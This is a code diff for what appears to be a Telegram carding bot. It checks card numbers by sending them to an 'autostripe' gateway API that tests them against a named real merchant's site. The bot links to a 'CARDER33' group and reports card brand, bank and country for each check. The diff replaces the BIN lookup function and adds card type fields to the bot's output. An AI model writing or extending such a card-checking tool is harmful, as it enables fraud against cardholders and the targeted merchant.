@@ -1383,6 +1383,7 @@ from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import ContextTypes
+from bin import get_bin_info   # ✅ use the correct function
 import re
 import logging
 
@@ -1395,85 +1396,33 @@ logger = logging.getLogger(__name__)
 user_cooldowns = {}
 
 async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
-        """Enforces a cooldown period for a user to prevent spamming."""
-        last_run = user_cooldowns.get(user_id, 0)
-        now = datetime.now().timestamp()
-        if now - last_run < cooldown_seconds:
-                await update.effective_message.reply_text(
-                        escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
-                        parse_mode=ParseMode.MARKDOWN_V2
-                )
-                return False
-        user_cooldowns[user_id] = now
-        return True
+    """Enforces a cooldown period for a user to prevent spamming."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
 
 async def consume_credit(user_id: int) -> bool:
-        """Consume 1 credit from DB user if available."""
-        user_data = await get_user(user_id)
-        if user_data and user_data.get("credits", 0) > 0:
-                new_credits = user_data["credits"] - 1
-                await update_user(user_id, credits=new_credits)
-                return True
-        return False
+    """Consume 1 credit from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
 
 # Replace with your *legit* group/channel link
 BULLET_GROUP_LINK = "https://t.me/CARDER33"
 
 def escape_markdown_v2(text: str) -> str:
-        """Escapes special characters for Telegram MarkdownV2."""
-        return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
-
-# ✅ Async BIN Lookup (antipublic.cc)
-# ===== BIN LOOKUP FUNCTION =====
-async def get_bin_details(bin_number: str) -> dict:
-    """
-    Fetch BIN details from new BIN API (binlist) with fallback defaults.
-    """
-    bin_data = {
-        "scheme": "N/A",
-        "type": "N/A",
-        "level": "N/A",
-        "bank": "N/A",
-        "country_name": "N/A",
-        "country_emoji": "",
-        "vbv_status": None,
-        "card_type": "N/A"
-    }
-
-    url = f"https://lookup.binlist.net/{bin_number}"
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Accept": "application/json"
-    }
-
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers, timeout=10) as response:
-                if response.status == 200:
-                    try:
-                        data = await response.json(content_type=None)
-
-                        bin_data["scheme"] = str(data.get("scheme", "N/A")).title()
-                        bin_data["type"] = str(data.get("type", "N/A")).title()
-                        bin_data["card_type"] = str(data.get("brand", "N/A")).title()
-                        bin_data["level"] = str(data.get("brand", "N/A")).title()
-
-                        bank = data.get("bank", {})
-                        country = data.get("country", {})
-
-                        bin_data["bank"] = str(bank.get("name", "N/A")).title()
-                        bin_data["country_name"] = country.get("name", "N/A")
-                        bin_data["country_emoji"] = country.get("emoji", "")
-
-                        return bin_data
-                    except Exception as e:
-                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
-                else:
-                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
-    except Exception as e:
-        logger.warning(f"BIN API call failed for {bin_number}: {e}")
-
-    return bin_data
+    """Escapes special characters for Telegram MarkdownV2."""
+    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
 
 
 # ===== BACKGROUND CHECK =====
@@ -1482,14 +1431,20 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
     try:
-        # BIN lookup
+        # BIN lookup (✅ using bin.py)
         bin_number = parts[0][:6]
-        bin_details = await get_bin_details(bin_number)
+        bin_details = await get_bin_info(bin_number)
 
         brand = (bin_details.get("scheme") or "N/A").title()
-        issuer = (bin_details.get("bank") or "N/A").title()
-        country_name = (bin_details.get("country_name") or "N/A")
+        issuer = bin_details.get("bank") or "N/A"
+        country_name = bin_details.get("country") or "N/A"
         country_flag = bin_details.get("country_emoji", "")
+        card_type = bin_details.get("type", "N/A")
+        card_level = bin_details.get("brand", "N/A")
+        card_length = bin_details.get("length", "N/A")
+        luhn_check = bin_details.get("luhn", "N/A")
+        bank_phone = bin_details.get("bank_phone", "N/A")
+        bank_url = bin_details.get("bank_url", "N/A")
 
         # Call your main API
         api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1540,6 +1495,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ `{escape_markdown_v2(brand)}`\n"
+            f"{bullet_link} 𝐓𝐲𝐩𝐞 ➜ `{escape_markdown_v2(card_type)}` | `{escape_markdown_v2(card_level)}`\n"
             f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ `{escape_markdown_v2(issuer)}`\n"
             f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ `{escape_markdown_v2(country_name)} {country_flag}`\n"
             f"――――――――――――――――\n"
